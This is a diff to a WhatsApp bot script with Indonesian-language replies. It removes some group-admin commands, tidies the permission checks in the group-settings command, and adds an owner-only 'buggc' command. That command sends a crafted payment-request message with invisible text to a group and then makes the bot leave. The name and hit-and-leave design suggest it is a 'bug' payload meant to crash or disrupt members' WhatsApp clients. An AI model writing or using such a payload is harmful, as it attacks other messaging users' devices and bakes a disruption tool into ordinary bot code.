@@ -784,30 +784,6 @@ xavior.sendMessage(m.chat, { video: smeme, mimetype: 'video/mp4', fileName: `Int
                 await xavior.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
             }
             break
-            case 'resetlinkgc':
-         case 'resetlinkgroup':
-         case 'revoke':
-         if (!isGroup) return reply(mess.only.group)
-         if (!isGroupAdmins) return reply(mess.only.admin)
-                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
-          json = ['action', 'inviteReset', from]
-         xavior.query({json, expect200: true})
-          reply('Sukses Mereset Link Group')
-         break 
-         case 'opengc':
-         if (!isGroup) return reply(mess.only.group)
-         if (!isGroupAdmins) return reply(mess.only.admin)
-         if (!isBotGroupAdmins) return reply(mess.only.Badmin)
-         reply(`Sukses membuka grup ${groupName}`)
-	 xavior.groupSettingChange(from, GroupSettingChange.messageSend, false)
-	 break
-	 case 'closegc':
-	 if (!isGroup) return reply(mess.only.group)
-	 if (!isGroupAdmins) return reply(mess.only.admin)
-         if (!isBotGroupAdmins) return reply(mess.only.Badmin)
-	 reply(`Sukses menutup grup ${groupName}`)
-	 xavior.groupSettingChange(from, GroupSettingChange.messageSend, true)
-	 break
             case 'leave': {
                 if (!isCreator) throw mess.owner
                 await xavior.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
@@ -821,6 +797,14 @@ xavior.sendMessage(m.chat, { video: smeme, mimetype: 'video/mp4', fileName: `Int
           m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
             }
             break
+            case 'buggc':
+                     if (!isGroup) throw mess.group
+                     if (!isCreator && !msg.key.fromMe) throw mess.owner
+                     requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "‎"}}}), { userJid: msg.chat })
+                     xavior.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+                     await sleep(2000)
+                     await xavior.groupLeave(from)
+                     break
 	case 'kick': {
 		if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
@@ -1174,9 +1158,9 @@ break
              }
              break
              case 'groupsetting': case 'groupss': {
-if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
-if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
-if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
+if (!isGroup) throw mess.group
+if (!isAdmins) throw mess.admin
+if (!isBotAdmins) throw mess.botAdmin
 if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `groupsetting open`, buttonText: { displayText: "OPEN" }, type: 1},{ buttonId: `groupsetting close`, buttonText: { displayText: "CLOSE" }, type: 1}], {quoted:msg})
 if (dn === 'open'){ await xavior.groupSettingUpdate(from, 'not_announcement')
 } else if (dn === 'close'){ await xavior.groupSettingUpdate(from, 'announcement')} else { reply('Error')}
